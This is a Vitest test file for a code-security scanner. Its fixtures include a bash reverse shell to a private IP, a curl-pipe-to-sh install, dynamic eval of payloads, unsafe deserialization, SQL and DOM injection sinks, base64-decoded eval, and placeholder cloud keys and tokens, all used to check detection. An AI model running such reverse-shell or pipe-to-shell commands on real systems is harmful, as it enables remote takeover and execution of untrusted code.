import { describe, it, expect } from 'vitest';
import { scanCode, overallRisk, type Finding } from './cyber';
import { isTextLike } from './upload';

const kinds = (fs: Finding[]) => fs.map(f => f.kind);

describe('scanCode — secrets', () => {
  it('flags an embedded private key as critical', () => {
    const fs = scanCode('-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----');
    expect(kinds(fs)).toContain('secret.private-key');
    expect(fs[0].severity).toBe('critical');
  });
  it('flags AWS keys, GitHub tokens, provider keys', () => {
    expect(kinds(scanCode('const k = "AKIAIOSFODNN7EXAMPLE"'))).toContain('secret.aws-key');
    expect(kinds(scanCode('token = "ghp_' + 'a'.repeat(36) + '"'))).toContain('secret.gh-token');
    expect(kinds(scanCode('OPENAI="sk-' + 'a'.repeat(40) + '"'))).toContain('secret.openai-key');
  });
  it('flags a generic hardcoded credential', () => {
    expect(kinds(scanCode('password = "hunter2plus"'))).toContain('secret.generic');
  });
  it('does NOT discount a secret that sits in a comment', () => {
    const fs = scanCode('# AKIAIOSFODNN7EXAMPLE');
    expect(fs.find(f => f.kind === 'secret.aws-key')?.severity).toBe('critical');
  });
});

describe('scanCode — execution & shells', () => {
  it('flags reverse-shell patterns as critical', () => {
    expect(kinds(scanCode('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))).toContain('exec.reverse-shell');
  });
  it('flags pipe-to-shell installs', () => {
    expect(kinds(scanCode('curl http://x/y.sh | sh'))).toContain('exec.pipe-shell');
  });
  it('flags dynamic eval/exec', () => {
    expect(kinds(scanCode('eval(userInput)'))).toContain('exec.dynamic');
    expect(kinds(scanCode('exec(payload)'))).toContain('exec.dynamic');
  });
  it('flags shell/process execution at medium', () => {
    const fs = scanCode('import os\nos.system(cmd)');
    expect(kinds(fs)).toContain('exec.shell');
  });
});

describe('scanCode — deserialization, injection, obfuscation', () => {
  it('flags unsafe deserialization', () => {
    expect(kinds(scanCode('data = pickle.loads(buf)'))).toContain('deser.unsafe');
    expect(kinds(scanCode('cfg = yaml.load(s)'))).toContain('deser.unsafe');
  });
  it('does not flag yaml.load when a Loader is passed', () => {
    expect(kinds(scanCode('cfg = yaml.load(s, Loader=yaml.SafeLoader)'))).not.toContain('deser.unsafe');
  });
  it('flags string-built SQL and DOM sinks', () => {
    expect(kinds(scanCode('db.query("SELECT * FROM u WHERE id=" + id)'))).toContain('inject.sql');
    expect(kinds(scanCode('el.innerHTML = untrusted'))).toContain('inject.dom');
  });
  it('flags base64-decoded execution', () => {
    expect(kinds(scanCode('eval(atob("Y29uc29sZS5sb2c="))'))).toContain('obf.base64-exec');
  });
});

describe('scanCode — cleanliness & ranking', () => {
  it('returns nothing for benign code', () => {
    expect(scanCode('function add(a, b) {\n  return a + b\n}\n')).toEqual([]);
  });
  it('returns nothing for empty input', () => {
    expect(scanCode('')).toEqual([]);
    expect(scanCode('   \n  ')).toEqual([]);
  });
  it('ranks most-severe first and reports the right line', () => {
    const code = 'const ok = 1\nel.innerHTML = x\n-----BEGIN PRIVATE KEY-----';
    const fs = scanCode(code);
    expect(fs[0].severity).toBe('critical');
    expect(fs[0].line).toBe(3);
  });
  it('discounts an exec sink that is commented out (but still reports it)', () => {
    const fs = scanCode('// eval(userInput)');
    const ev = fs.find(f => f.kind === 'exec.dynamic');
    expect(ev).toBeTruthy();
    expect(ev!.severity).toBe('medium'); // high → discounted one band in a comment
  });
});

describe('overallRisk', () => {
  it('is info for no findings, else the max severity', () => {
    expect(overallRisk([])).toBe('info');
    expect(overallRisk(scanCode('el.innerHTML = x'))).toBe('medium');
    expect(overallRisk(scanCode('-----BEGIN PRIVATE KEY-----'))).toBe('critical');
  });
});

describe('isTextLike (upload routing)', () => {
  it('treats source/text by extension or mime', () => {
    expect(isTextLike('notes.txt', '')).toBe(true);
    expect(isTextLike('a.py', '')).toBe(true);
    expect(isTextLike('x', 'text/plain')).toBe(true);
  });
  it('routes binary docs to the converter', () => {
    expect(isTextLike('report.pdf', 'application/pdf')).toBe(false);
    expect(isTextLike('memo.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')).toBe(false);
  });
});
